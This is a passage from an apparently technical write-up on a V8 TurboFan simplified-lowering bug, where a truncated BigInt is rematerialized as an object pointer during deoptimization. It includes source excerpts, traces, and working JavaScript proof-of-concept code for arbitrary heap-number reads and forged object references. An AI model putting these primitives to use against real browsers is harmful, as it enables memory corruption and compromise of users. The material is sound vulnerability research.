    <span class="k">return</span> <span class="n">UseInfo</span><span class="p">(</span><span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kNone</span><span class="p">,</span> <span class="n">Truncation</span><span class="o">::</span><span class="n">Any</span><span class="p">());</span>
  <span class="p">}</span>
  <span class="c1">// Value not used.</span>
  <span class="k">static</span> <span class="n">UseInfo</span> <span class="nf">None</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">UseInfo</span><span class="p">(</span><span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kNone</span><span class="p">,</span> <span class="n">Truncation</span><span class="o">::</span><span class="n">None</span><span class="p">());</span>
  <span class="p">}</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">Truncation</span><span class="o">::</span><span class="n">description</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">kind</span><span class="p">())</span> <span class="p">{</span>
  <span class="c1">// ...</span>
    <span class="k">case</span> <span class="n">TruncationKind</span><span class="o">::</span><span class="nl">kAny</span><span class="p">:</span>
      <span class="k">switch</span> <span class="p">(</span><span class="n">identify_zeros</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">TruncationKind</span><span class="o">::</span><span class="nl">kNone</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">&quot;no-value-use&quot;</span><span class="p">;</span>
        <span class="c1">// ...</span>
        <span class="k">case</span> <span class="nl">kIdentifyZeros</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">&quot;no-truncation (but identify zeros)&quot;</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">kDistinguishZeros</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">&quot;no-truncation (but distinguish zeros)&quot;</span><span class="p">;</span>
      <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<p>If we trace the first phase of simplified lowering (truncation propagation), we'll get the following input :</p>
<div class="highlight"><pre><span></span><code> visit #46: FrameState (trunc: no-truncation (but distinguish zeros))
   queue #7?: no-truncation (but distinguish zeros)
  initial #45: no-truncation (but distinguish zeros)
   queue #71?: no-truncation (but distinguish zeros)
   queue #4?: no-truncation (but distinguish zeros)
   queue #62?: no-truncation (but distinguish zeros)
   queue #0?: no-truncation (but distinguish zeros)
</code></pre></div>

<p>All the inputs are added to the queue, no truncation is ever propagated. The node <code>#71</code> corresponds to the accumulator since it is the 3rd input. </p>
<div class="highlight"><pre><span></span><code> visit #71: BigIntAsUintN (trunc: no-truncation (but distinguish zeros))
   queue #70?: no-value-use
</code></pre></div>

<p>In our example, the accumulator input is a <code>BigIntAsUintN</code> node. Such a node consumes an input which is a <code>word64</code> and is truncated to a <code>word64</code>.</p>
<blockquote>
<p><em>The astute reader will wonder what happens if this node returns a number that requires more than 64 bits. The answer lies in the inlining phase. Indeed, a JSCall to the BigInt.AsUintN builtin will be reduced to a BigIntAsUintN turbofan operator only in the case where TurboFan is guaranted that the requested width is of 64-bit a most.</em></p>
</blockquote>
<p>This node outputs a <code>word64</code> and has <code>BigInt</code> as a restriction type. During the type propagation phase, any type computed for a given node will be intersected with its restriction type.</p>
<div class="highlight"><pre><span></span><code>      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kBigIntAsUintN</span><span class="p">:</span> <span class="p">{</span>
        <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">TruncatingWord64</span><span class="p">());</span>
        <span class="n">SetOutput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kWord64</span><span class="p">,</span> <span class="n">Type</span><span class="o">::</span><span class="n">BigInt</span><span class="p">());</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>
</code></pre></div>

<p>So at this point (after the propagation phase and before the lowering phase), if we focus on the <code>FrameState</code> node and its accumulator input node (3rd input), we can say the following : </p>
<ul>
<li>the FrameState's 2nd input expects MachineRepresentation::kNone (includes everything, especially kWord64)</li>
<li>the FrameState doesn't truncate its 2nd input</li>
<li>the BigIntAsUintN output representation is kWord64</li>
</ul>
<p>Because the input 2 is used as <code>Any</code> (with a <code>kNone</code> representation), there won't ever be any conversion of the input node : </p>
<div class="highlight"><pre><span></span><code>  <span class="c1">// Converts input {index} of {node} according to given UseInfo {use},</span>
  <span class="c1">// assuming the type of the input is {input_type}. If {input_type} is null,</span>
  <span class="c1">// it takes the input from the input node {TypeOf(node-&gt;InputAt(index))}.</span>
  <span class="kt">void</span> <span class="nf">ConvertInput</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="kt">int</span> <span class="n">index</span><span class="p">,</span> <span class="n">UseInfo</span> <span class="n">use</span><span class="p">,</span>
                    <span class="n">Type</span> <span class="n">input_type</span> <span class="o">=</span> <span class="n">Type</span><span class="o">::</span><span class="n">Invalid</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">input</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="n">index</span><span class="p">);</span>
    <span class="c1">// In the change phase, insert a change before the use if necessary.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">use</span><span class="p">.</span><span class="n">representation</span><span class="p">()</span> <span class="o">==</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kNone</span><span class="p">)</span>
      <span class="k">return</span><span class="p">;</span>  <span class="c1">// No input requirement on the use.</span>
</code></pre></div>

<p>So what happens during during the last phase of simplified lowering (the phase that lowers nodes and adds conversions)? 
If we look at the visitor of <code>FrameState</code> nodes, we can see that eventually the accumulator input may get replaced by a <code>TypedStateValues</code> node. The <code>BigIntAsUintN</code> node is now the input of the <code>TypedStateValues</code> node. No conversion of any kind is ever done.</p>
<div class="highlight"><pre><span></span><code>  <span class="n">ZoneVector</span><span class="o">&lt;</span><span class="n">MachineType</span><span class="o">&gt;*</span> <span class="n">types</span> <span class="o">=</span>
      <span class="k">new</span> <span class="p">(</span><span class="n">zone</span><span class="o">-&gt;</span><span class="n">New</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ZoneVector</span><span class="o">&lt;</span><span class="n">MachineType</span><span class="o">&gt;</span><span class="p">)))</span>
          <span class="n">ZoneVector</span><span class="o">&lt;</span><span class="n">MachineType</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">zone</span><span class="p">);</span>
  <span class="p">(</span><span class="o">*</span><span class="n">types</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">DeoptMachineTypeOf</span><span class="p">(</span><span class="n">GetInfo</span><span class="p">(</span><span class="n">accumulator</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">representation</span><span class="p">(),</span>
                                   <span class="n">TypeOf</span><span class="p">(</span><span class="n">accumulator</span><span class="p">));</span>

  <span class="n">node</span><span class="o">-&gt;</span><span class="n">ReplaceInput</span><span class="p">(</span>
      <span class="mi">2</span><span class="p">,</span> <span class="n">jsgraph_</span><span class="o">-&gt;</span><span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">jsgraph_</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">TypedStateValues</span><span class="p">(</span>
                                        <span class="n">types</span><span class="p">,</span> <span class="n">SparseInputMask</span><span class="o">::</span><span class="n">Dense</span><span class="p">()),</span>
                                    <span class="n">accumulator</span><span class="p">));</span>
</code></pre></div>

<p>Also, the vector of MachineType is associated to the TypedStateValues. To compute the machine type, <code>DeoptMachineTypeOf</code> relies on the node's type.</p>
<p>In that case (a BigIntAsUintN node), the type will be <code>Type::BigInt()</code>.</p>
<div class="highlight"><pre><span></span><code><span class="n">Type</span> <span class="n">OperationTyper</span><span class="o">::</span><span class="n">BigIntAsUintN</span><span class="p">(</span><span class="n">Type</span> <span class="n">type</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">BigInt</span><span class="p">()));</span>
  <span class="k">return</span> <span class="n">Type</span><span class="o">::</span><span class="n">BigInt</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<p>As we just saw, because for this node the output representation is kWord64 and the type is BigInt, the <code>MachineType</code> is <code>MachineType::AnyTagged</code>.</p>
<div class="highlight"><pre><span></span><code>  <span class="k">static</span> <span class="n">MachineType</span> <span class="nf">DeoptMachineTypeOf</span><span class="p">(</span><span class="n">MachineRepresentation</span> <span class="n">rep</span><span class="p">,</span> <span class="n">Type</span> <span class="n">type</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// ..</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rep</span> <span class="o">==</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kWord64</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">BigInt</span><span class="p">()))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">MachineType</span><span class="o">::</span><span class="n">AnyTagged</span><span class="p">();</span>
      <span class="p">}</span>
<span class="c1">// ...</span>
  <span class="p">}</span>
</code></pre></div>

<p>So if we look at the sea of node right after the escape analysis phase and before the simplified lowering phase, it looks like this : </p>
<!--<center>![before_typed_state_value](\images\before_adding_typed_state_values.png)</center>-->
<p><center><img src="\images\before_adding_typed_state_values.png" width="25%"></img></center></p>
<p>And after the simplified lowering phase, we can confirm that a <code>TypedStateValues</code> node was indeed inserted.</p>
<!--<center>![after](\images\simplified_lowering_vuln-1576726613725.png)</center>-->
<p><center><img src="\images\simplified_lowering_vuln-1576726613725.png" width="25%"></img></center></p>
<p>After effect control linearization, the <code>BigIntAsUintN</code> node gets lowered to a <code>Word64And</code> node. </p>
<!--<center>![full_vuln](\images\full_vuln.png)</center>-->
<p><center><img src="\images\full_vuln.png" width="60%"></img></center></p>
<p>As we learned earlier, the <code>FrameState</code> and <code>TypedStateValues</code> nodes do not directly correspond to any code generation. </p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="n">InstructionSelector</span><span class="o">::</span><span class="n">VisitNode</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">opcode</span><span class="p">())</span> <span class="p">{</span>
  <span class="c1">// ...</span>
    <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kFrameState</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kStateValues</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kObjectState</span><span class="p">:</span>
      <span class="k">return</span><span class="p">;</span>
  <span class="c1">// ...</span>
</code></pre></div>

<p>However, other nodes may make use of <code>FrameState</code> and <code>TypedStateValues</code> nodes. This is the case for instance of the various <code>Deoptimize</code> nodes and also <code>Call</code> nodes.</p>
<!--<center>![check_property_foo_or_deopt](\images\check_property_foo_or_deopt.png)</></center>-->
<p><center><img src="\images\check_property_foo_or_deopt.png" width="60%"></img></center></p>
<p>They will make the <code>instruction selector</code> build the necessary <code>FrameStateDescriptor</code> and <code>StateValueList</code> of <code>StateValueDescriptor</code>.</p>
<p>Using those structures, the <code>code generator</code> will then build the necessary <code>DeoptimizationExit</code>s to which a <code>Translation</code> will be associated with. The function <code>BuildTranslation</code> will handle the the <code>InstructionOperand</code>s in <code>CodeGenerator::AddTranslationForOperand</code>. And this is where the (AnyTagged) <code>MachineType</code> corresponding to the <code>BigIntAsUintN</code> node is used! When building the translation, we are using the BigInt value as if it was a pointer (second branch) and not a double value (first branch)!</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="n">CodeGenerator</span><span class="o">::</span><span class="n">AddTranslationForOperand</span><span class="p">(</span><span class="n">Translation</span><span class="o">*</span> <span class="n">translation</span><span class="p">,</span>
                                             <span class="n">Instruction</span><span class="o">*</span> <span class="n">instr</span><span class="p">,</span>
                                             <span class="n">InstructionOperand</span><span class="o">*</span> <span class="n">op</span><span class="p">,</span>
                                             <span class="n">MachineType</span> <span class="n">type</span><span class="p">)</span> <span class="p">{</span>      
  <span class="k">case</span> <span class="n">Constant</span><span class="o">::</span><span class="nl">kInt64</span><span class="p">:</span>
        <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">kSystemPointerSize</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">representation</span><span class="p">()</span> <span class="o">==</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kWord64</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">literal</span> <span class="o">=</span>
              <span class="n">DeoptimizationLiteral</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;</span><span class="p">(</span><span class="n">constant</span><span class="p">.</span><span class="n">ToInt64</span><span class="p">()));</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="c1">// When pointers are 8 bytes, we can use int64 constants to represent</span>
          <span class="c1">// Smis.</span>
          <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTagged</span><span class="p">,</span> <span class="n">type</span><span class="p">.</span><span class="n">representation</span><span class="p">());</span>
          <span class="n">Smi</span> <span class="nf">smi</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="n">Address</span><span class="o">&gt;</span><span class="p">(</span><span class="n">constant</span><span class="p">.</span><span class="n">ToInt64</span><span class="p">()));</span>
          <span class="n">DCHECK</span><span class="p">(</span><span class="n">smi</span><span class="p">.</span><span class="n">IsSmi</span><span class="p">());</span>
          <span class="n">literal</span> <span class="o">=</span> <span class="n">DeoptimizationLiteral</span><span class="p">(</span><span class="n">smi</span><span class="p">.</span><span class="n">value</span><span class="p">());</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
</code></pre></div>

<p>This is very interesting because that means at runtime (when deoptimizing), the deoptimizer uses this pointer to rematerialize an object! But since this is a controlled value (the truncated big int), we can make the deoptimizer reference an arbitrary object and thus make the next ignition bytecode handler use (or not) this crafted reference.</p>
<p>In this case, we are playing with the accumulator register. Therefore, to find interesting primitives, what we need to do is to look for all the bytecode handlers that get the accumulator (using a <code>GetAccumulator</code> for instance).</p>
<h3 id="experiment-1-reading-an-arbitrary-heap-number">Experiment 1 - reading an arbitrary heap number</h3>
<p>The most obvious primitive is the one we get by deoptimizing to the ignition handler for add opcodes.</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x11111111</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">setAddress</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">addr</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">.</span><span class="nx">asUintN</span><span class="p">(</span><span class="mi">49</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
  <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">111</span><span class="p">;</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="mf">1.1</span> <span class="o">+</span> <span class="nx">y</span><span class="p">;</span> <span class="c1">// will trigger a deoptimization. reason : &quot;Insufficient type feedback for binary operation&quot;</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">catch</span><span class="p">(</span><span class="nx">_</span><span class="p">){</span> <span class="k">return</span> <span class="nx">y</span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">compileOnce</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">f</span><span class="p">({</span><span class="nx">x</span><span class="o">:</span><span class="mf">1.1</span><span class="p">});</span>
  <span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">({</span><span class="nx">x</span><span class="o">:</span><span class="mf">1.1</span><span class="p">});</span>
  <span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
  <span class="k">return</span> <span class="nx">f</span><span class="p">({</span><span class="nx">x</span><span class="o">:</span><span class="mf">1.1</span><span class="p">});</span>
<span class="p">}</span>
</code></pre></div>

<p>When reading the implementation of the handler (<code>BinaryOpAssembler::Generate_AddWithFeedback</code> in <code>src/ic/bin-op-assembler.cc</code>), we observe that for heap numbers additions, the code ends up calling the function <code>LoadHeapNumberValue</code>. In that case, it gets called with an arbitrary pointer.</p>
<p>To demonstrate the bug, we use the <code>%DebugPrint</code> runtime function to get the address of an object (simulate an infoleak primitive) and see that we indeed (incorrectly) read its value.</p>
<div class="highlight"><pre><span></span><code>d8&gt; var a = new Number(3.14); %DebugPrint(a)
0x025f585caa49 &lt;Number map = 000000FB210820A1 value = 0x019d1cb1f631 &lt;HeapNumber 3.14&gt;&gt;
3.14
d8&gt; setAddress(0x025f585caa49)
undefined
d8&gt; compileOnce()
4.24
</code></pre></div>

<p>We can get the same primitive using other kind of ignition bytecode handlers such as <code>+</code>, <code>-</code>,<code>/</code>,<code>*</code> or <code>%</code>.</p>
<div class="highlight"><pre><span></span><code><span class="gd">--- var res = 1.1 + y;</span>
<span class="gi">+++ var res = y / 1;</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code>d8&gt; var a = new Number(3.14); %DebugPrint(a)
0x019ca5a8aa11 &lt;Number map = 00000138F15420A1 value = 0x0168e8ddf611 &lt;HeapNumber 3.14&gt;&gt;
3.14
d8&gt; setAddress(0x019ca5a8aa11)
undefined
d8&gt; compileOnce()
3.14
</code></pre></div>

<p>The <code>--trace-ignition</code> debugging utility can be interesting in this scenario. For instance, let's say we use a BigInt value of <code>0x4200000000</code> and instead of doing <code>1.1 + y</code> we do <code>y / 1</code>. Then we want to trace it and confirm the behaviour that we expect.</p>
<p>The trace tells us : </p>
<ul>
<li>a deoptimization was triggered and why (insufficient type feedback for binary operation, this binary operation being the division)</li>
<li>in the input frame, there is a register entry containing the bigint value thanks to (or because of) the incorrect lowering <code>11: 0x004200000000 ; rcx 66</code></li>
<li>in the translated interpreted frame the accumulator gets the value <code>0x004200000000 (&lt;Smi 66&gt;)</code></li>
<li>we deoptimize directly to the offset 39 which corresponds to <code>DivSmi [1], [6]</code></li>
</ul>
<div class="highlight"><pre><span></span><code>[deoptimizing (DEOPT soft): begin 0x01b141c5f5f1 &lt;JSFunction f (sfi = 000001B141C5F299)&gt; (opt #0) @3, FP to SP delta: 40, caller sp: 0x0042f87fde08]
            ;;; deoptimize at &lt;read_heap_number.js:11:17&gt;, Insufficient type feedback for binary operation
  reading input frame f =&gt; bytecode_offset=39, args=2, height=8, retval=0(#0); inputs:
      0: 0x01b141c5f5f1 ;  [fp -  16]  0x01b141c5f5f1 &lt;JSFunction f (sfi = 000001B141C5F299)&gt;
      1: 0x03a35e2c1349 ;  [fp +  24]  0x03a35e2c1349 &lt;JSGlobal Object&gt;
      2: 0x03a35e2cb3b1 ;  [fp +  16]  0x03a35e2cb3b1 &lt;Object map = 0000019FAF409DF1&gt;
      3: 0x01b141c5f551 ;  [fp -  24]  0x01b141c5f551 &lt;ScriptContext[5]&gt;
      4: 0x03a35e2cb3d1 ; rdi 0x03a35e2cb3d1 &lt;BigInt 283467841536&gt;
      5: 0x00422b840df1 ; (literal  2) 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt;
      6: 0x00422b840df1 ; (literal  2) 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt;
      7: 0x01b141c5f551 ;  [fp -  24]  0x01b141c5f551 &lt;ScriptContext[5]&gt;
      8: 0x00422b840df1 ; (literal  2) 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt;
      9: 0x00422b840df1 ; (literal  2) 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt;
     10: 0x00422b840df1 ; (literal  2) 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt;
     11: 0x004200000000 ; rcx 66
  translating interpreted frame f =&gt; bytecode_offset=39, height=64
    0x0042f87fde00: [top + 120] &lt;- 0x03a35e2c1349 &lt;JSGlobal Object&gt; ;  stack parameter (input #1)
    0x0042f87fddf8: [top + 112] &lt;- 0x03a35e2cb3b1 &lt;Object map = 0000019FAF409DF1&gt; ;  stack parameter (input #2)
    -------------------------
    0x0042f87fddf0: [top + 104] &lt;- 0x7ffd93f64c1d ;  caller&#39;s pc
    0x0042f87fdde8: [top +  96] &lt;- 0x0042f87fde38 ;  caller&#39;s fp
    0x0042f87fdde0: [top +  88] &lt;- 0x01b141c5f551 &lt;ScriptContext[5]&gt; ;  context (input #3)
    0x0042f87fddd8: [top +  80] &lt;- 0x01b141c5f5f1 &lt;JSFunction f (sfi = 000001B141C5F299)&gt; ;  function (input #0)
    0x0042f87fddd0: [top +  72] &lt;- 0x01b141c5fa41 &lt;BytecodeArray[61]&gt; ;  bytecode array
    0x0042f87fddc8: [top +  64] &lt;- 0x005c00000000 &lt;Smi 92&gt; ;  bytecode offset
    -------------------------
    0x0042f87fddc0: [top +  56] &lt;- 0x03a35e2cb3d1 &lt;BigInt 283467841536&gt; ;  stack parameter (input #4)
    0x0042f87fddb8: [top +  48] &lt;- 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #5)
    0x0042f87fddb0: [top +  40] &lt;- 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #6)
    0x0042f87fdda8: [top +  32] &lt;- 0x01b141c5f551 &lt;ScriptContext[5]&gt; ;  stack parameter (input #7)
    0x0042f87fdda0: [top +  24] &lt;- 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #8)
    0x0042f87fdd98: [top +  16] &lt;- 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #9)
    0x0042f87fdd90: [top +   8] &lt;- 0x00422b840df1 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #10)
    0x0042f87fdd88: [top +   0] &lt;- 0x004200000000 &lt;Smi 66&gt; ;  accumulator (input #11)
[deoptimizing (soft): end 0x01b141c5f5f1 &lt;JSFunction f (sfi = 000001B141C5F299)&gt; @3 =&gt; node=39, pc=0x7ffd93f65100, caller sp=0x0042f87fde08, took 2.328 ms]
 -&gt; 000001B141C5FA9D @   39 : 43 01 06          DivSmi [1], [6]
      [ accumulator -&gt; 66 ]
      [ accumulator &lt;- 66 ]
 -&gt; 000001B141C5FAA0 @   42 : 26 f9             Star r2
      [ accumulator -&gt; 66 ]
      [          r2 &lt;- 66 ]
 -&gt; 000001B141C5FAA2 @   44 : a9                Return 
      [ accumulator -&gt; 66 ]
</code></pre></div>

<h3 id="experiment-2-getting-an-arbitrary-object-reference">Experiment 2 - getting an arbitrary object reference</h3>
<p>This bug also gives a better, more powerful, primitive. Indeed, if instead of deoptimizing back to an add handler, we deoptimize to <code>Builtins_StaKeyedPropertyHandler</code>, we'll be able to store an arbitrary object reference in an object property. Therefore, if an attacker is also able to leverage an infoleak primitive, he would be able to craft any arbitrary object (these are sometimes referred to as <code>addressof</code> and <code>fakeobj</code> primitives) .</p>
<p>In order to deoptimize to this specific handler, aka deoptimize on <code>obj[x] = y</code>, we have to make this line do something that violates a speculation. If we repeatedly call the function <code>f</code> with the same property name, TurboFan will speculate that we're always gonna add the same property. Once the code is optimized, using a property with a different name will violate this assumption, call the deoptimizer and then redirect execution to the <code>StaKeyedProperty</code> handler.</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x11111111</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">setAddress</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">addr</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">.</span><span class="nx">asUintN</span><span class="p">(</span><span class="mi">49</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
  <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">111</span><span class="p">;</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="nx">obj</span><span class="p">[</span><span class="nx">x</span><span class="p">]</span> <span class="o">=</span> <span class="nx">y</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">obj</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">catch</span><span class="p">(</span><span class="nx">_</span><span class="p">){</span> <span class="k">return</span> <span class="nx">y</span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">compileOnce</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">f</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
  <span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
  <span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="nx">f</span><span class="p">(</span><span class="s2">&quot;boom&quot;</span><span class="p">);</span> <span class="c1">// deopt reason : wrong name</span>
<span class="p">}</span>
</code></pre></div>

<p>To experiment, we simply simulate the infoleak primitive by simply using a runtime function <code>%DebugPrint</code> and adding an ArrayBuffer to the object. That should not be possible since the javascript code is actually adding a truncated BigInt.</p>
<div class="highlight"><pre><span></span><code>d8&gt; var a = new ArrayBuffer(8); %DebugPrint(a);
0x003d5ef8ab79 &lt;ArrayBuffer map = 00000354B09C2191&gt;
[object ArrayBuffer]
d8&gt; setAddress(0x003d5ef8ab79)
undefined
d8&gt; var badobj = compileOnce()
undefined
d8&gt; %DebugPrint(badobj)
0x003d5ef8d159 &lt;Object map = 00000354B09C9F81&gt;
{boom: [object ArrayBuffer]}
d8&gt; badobj.boom
[object ArrayBuffer]
</code></pre></div>

<p><s>Et voila!</s> Sweet as!</p>
<h3 id="variants">Variants</h3>
<p>We saw with the first commit that the pattern affected <code>FrameState</code> nodes but also <code>StateValues</code> nodes.</p>
<p><a href="https://chromium-review.googlesource.com/c/v8/v8/+/1936468">Another commit</a> further fixed the exact same bug affecting <code>ObjectState</code> nodes.</p>
<div class="highlight"><pre><span></span><code>From 3ce6be027562ff6641977d7c9caa530c74a279ac Mon Sep 17 00:00:00 2001
From: Nico Hartmann &lt;nicohartmann@chromium.org&gt;
Date: Tue, 26 Nov 2019 13:17:45 +0100
Subject: [PATCH] [turbofan] Fixes crash caused by truncated bigint

Bug: chromium:1028191
Change-Id: Idfcd678b3826fb6238d10f1e4195b02be35c3010
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/1936468
Commit-Queue: Nico Hartmann &lt;nicohartmann@chromium.org&gt;
Reviewed-by: Georg Neis &lt;neis@chromium.org&gt;
Cr-Commit-Position: refs/heads/master@{#65173}
<span class="gd">---</span>

<span class="gh">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span>
<span class="gh">index 4c000af..f271469 100644</span>
<span class="gd">--- a/src/compiler/simplified-lowering.cc</span>
<span class="gi">+++ b/src/compiler/simplified-lowering.cc</span>
<span class="gu">@@ -1254,7 +1254,13 @@</span>
   void VisitObjectState(Node* node) {
     if (propagate()) {
       for (int i = 0; i &lt; node-&gt;InputCount(); i++) {
<span class="gd">-        EnqueueInput(node, i, UseInfo::Any());</span>
<span class="gi">+        // TODO(nicohartmann): Remove, once the deoptimizer can rematerialize</span>
<span class="gi">+        // truncated BigInts.</span>
<span class="gi">+        if (TypeOf(node-&gt;InputAt(i)).Is(Type::BigInt())) {</span>
